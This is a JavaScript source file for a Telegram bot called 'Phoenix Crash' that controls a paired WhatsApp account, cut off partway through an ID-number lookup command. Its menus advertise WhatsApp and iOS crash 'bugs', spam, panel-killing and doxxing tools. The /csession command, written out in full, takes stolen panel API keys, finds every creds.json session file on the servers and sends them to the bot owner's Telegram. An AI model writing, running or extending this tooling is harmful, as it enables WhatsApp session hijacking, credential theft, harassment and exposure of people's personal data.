const databaseUrl = "https://raw.githubusercontent.com/azzam1235/FaiqDb/refs/heads/main/Faiq.json";
const thumbnailUrl = "https://i.top4top.io/p_3652mc8d39.png";

const axios = require('axios');
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const FormData = require("form-data");
const https = require("https");
const moment = require('moment-timezone');
const EventEmitter = require('events')
const pino = require('pino');
const { performance } = require('perf_hooks');
const crypto = require('crypto');
const chalk = require('chalk');
const { exec } = require("child_process");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require("reyzbails");
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${lastPairingMessage.phoneNumber}
│ ⸙ Pairing: ${lastPairingMessage.pairingCode}
│ ⸙ Status: Connected
╰═──────────────────═⬡</blockquote>
`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${lastPairingMessage.phoneNumber}
│ ⸙ Pairing: ${lastPairingMessage.pairingCode}
│ ⸙ Status: Connected
╰═──────────────────═⬡</blockquote>
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const { Markup } = require("telegraf");

const mainKeyboard = Markup.keyboard([
  ["Control", "Attack"],
  ["Tools"],
  ["Support"],
  ["🌍"]
])
.resize()
.persistent();

bot.hears("🌍", (ctx) => {
  ctx.reply("https://t.me/Aboutfnl");
});

bot.start(async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const menuMessage = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭═──⊱ PHOENIX CRASH ─═⬡
│ Developer : @Zennzyyy
│ Version   : 4.0
│ Prefix    : / (slash) 
│ Language  : JavaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ Sender   : ${senderStatus}
│ Runtime  : ${runtimeStatus}
│ Memory   : ${memoryStatus}
│ Cooldown : ${cooldownStatus} Second
╰═─────────────═⬡
</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Control", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  
  const controlsMenu = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 4.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ CONTROLS MENU ─────═⬡
│ ⸙ /requestpair — Adding Sender Number
│ ⸙ /setcooldown — Setting Bot Cooldown
│ ⸙ /resetsession — Reset Sender Number
│ ⸙ /addpremium — Adding Premium Users
│ ⸙ /delpremium — Deleting Premium User
│ ⸙ /addgcpremium — Adding Premium Groups
│ ⸙ /delgcpremium — Deleting Premium Group
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: controlsMenu,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Attack", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 4.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ BUGS MENU ─────═⬡
│ ⸙ /phoenixCrash — Crash Infinity
│ ⸙ /phoenixClick — Force Close Click
│ ⸙ /majesticdelay — Invisible Draining Quota
│ ⸙ /iossCrash — Crash Home Ios
│ ⸙ /testfunction — Test Your Own Function
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Tools", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 4.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ TOOLS MENU ─────═⬡
│ ⸙ /csession — Stealing Session Use Adp
│ ⸙ /trackip — Searching Ip Information
│ ⸙ /parsenik — Viewing Nik Information
│ ⸙ /spamngl — Spamming Ngl No Limit
│ ⸙ /tiktokdl — Download Content No Wm
│ ⸙ /iphoneqc — Create Iphone Style Words
│ ⸙ /writebook — Write Anything In A Book
│ ⸙ /fixcode — Fixing Script Errors With Ai
│ ⸙ /killpanel — Damage And Kill Panel
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.hears("Support", async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const text = `
<blockquote expandable>
ハローハウ ${ctx.from.first_name}, 私はあなたを助けることができるロボットです。できるだけ私を活用してください。

╭═──⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─═⬡
│ ⸙ Developer: @Zennzyyy
│ ⸙ Version: 4.0
│ ⸙ Prefix: / ( slash )
│ ⸙ Language: javaScript
╰═─────────────═⬡

╭═──⊱ BOT STATUS ──═⬡
│ ⸙ Sender: ${senderStatus}
│ ⸙ Runtime: ${runtimeStatus}
│ ⸙ Memory: ${memoryStatus}
│ ⸙ Cooldown: ${cooldownStatus} Second
╰═─────────────═⬡

╭═─────⊱ THANKS TO ─────═⬡
│ ⸙ @Zennzyyy — The Developer
│ ⸙ @FaiqOffc — Support
╰═──────────────────═⬡</blockquote>
`;

  await ctx.replyWithPhoto(thumbnailUrl, {
    caption: text,
    parse_mode: "HTML",
    ...mainKeyboard
  });
});

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Number: ${phoneNumber}
│ ⸙ Pairing: ${formattedCode}
│ ⸙ Status: Not Connected
╰═──────────────────═⬡</blockquote>
`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

//

bot.command("csession", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csession https://domainpanel.com,ptla_123,pltc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csession https://panelku.com,plta_123,pltc_123");

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      });
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      );
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");

        if (isDirectory(item)) {
          const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
          if (more.length) found = found.concat(more);
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();

    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    const serverNames = servers.map((srv, i) => {
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        (srv.attributes && srv.attributes.identifier) ||
        `server-${i + 1}`;
      return `${i + 1}. ${name}`;
    });

    const header = `🪧 ☇ Ditemukan ${servers.length} server di panel ini\n`;
    let message = header + serverNames.join("\n");
    if (message.length > 3500) {
      message =
        header +
        serverNames.slice(0, 50).join("\n") +
        `\n dan ${servers.length - 50} server lainnya`;
    }
    await ctx.reply(message);

    await ctx.reply("⏳☇ Pemindaian akan dimulai dalam 3 detik");
    await sleep(1000);
    await sleep(1000);
    await sleep(1000);
    await ctx.reply("⏳  ☇ Pemindaian creds.json dimulai");

    let totalFound = 0;

    for (let i = 0; i < servers.length; i++) {
      const srv = servers[i];
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";

      if (!identifier) continue;

      await ctx.reply(`🔎 ☇ [${i + 1}/${servers.length}] Mengecek session di server panel ${name}`);

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name}, di path ${filePath}`
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            );

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan url download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      } else {
        await ctx.reply(`✅ ☇ Tidak ditemukan creds.json di server ${name}`);
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai, tidak ditemukan creds.json di seluruh server");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai, total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("trackip", checkPremium, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const r = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(([0-9a-fA-F]{1,4}:){1,7}:)|(:([0-9a-fA-F]{1,4}:){1,7})|(([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})|(([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2})|(([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3})|(([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4})|(([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5})|([0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6}))|(:((:[0-9a-fA-F]{1,4}){1,7}|:)))(%.+)?$/;
    return r.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ Ip tidak valid");
  }

  let processingMsg = null;
  try {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking ${ip} sedang diproses`, { parse_mode: "HTML" });
  } catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking ${ip} sedang diproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;
    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}` : null;

    const caption = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Ip: ${data.ip || "-"}
│ ⸙ Negara: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
│ ⸙ Wilayah: ${data.region || "-"}
│ ⸙ Kota: ${data.city || "-"}
│ ⸙ Zip: ${data.postal || "-"}
│ ⸙ Waktu: ${data.timezone_gmt || "-"}
│ ⸙ Isp: ${data.isp || "-"}
│ ⸙ Org: ${data.org || "-"}
│ ⸙ Asn: ${data.asn || "-"}
│ ⸙ Lat/Lon: ${lat || "-"}, ${lon || "-"}
╰═──────────────────═⬡</blockquote>
`.trim();

    const replyOpts = { parse_mode: "HTML", disable_web_page_preview: true };
    if (mapsUrl) {
      replyOpts.reply_markup = {
        inline_keyboard: [[{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]]
      };
    }

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: caption,
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: replyOpts.reply_markup
    });

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data, coba lagi nanti");
  }
});

bot.command("parsenik", checkPremium, checkCooldown, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /parsenik 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ Nik harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan nik");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Nik: ${get(d.nik) || nik}
│ ⸙ Nama: ${get(d.nama)}
│ ⸙ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
